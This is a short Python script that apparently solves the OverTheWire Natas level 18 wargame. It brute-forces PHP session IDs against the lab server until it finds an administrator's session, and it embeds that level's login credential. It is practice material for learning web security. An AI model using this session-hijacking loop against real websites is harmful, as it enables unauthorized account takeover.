import requests

# Constants
BASE_URL = 'http://natas18.natas.labs.overthewire.org'
BASE_USERNAME = 'natas18'
BASE_PASSWORD = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'
MAX_SESSION_ID = 640
PARAMS = dict(username='admin', password='test')

# Brute-forcing session ids
for s_id in range(1, MAX_SESSION_ID + 1):
    print(f"Trying with PHPSESSID = {s_id}")
    cookies = dict(PHPSESSID=str(s_id))
    response = requests.get(BASE_URL, auth=(BASE_USERNAME, BASE_PASSWORD), params=PARAMS, cookies=cookies)

    if "You are an admin" in response.text:
        print(response.text)
        break

print("Finished brute-forcing.")
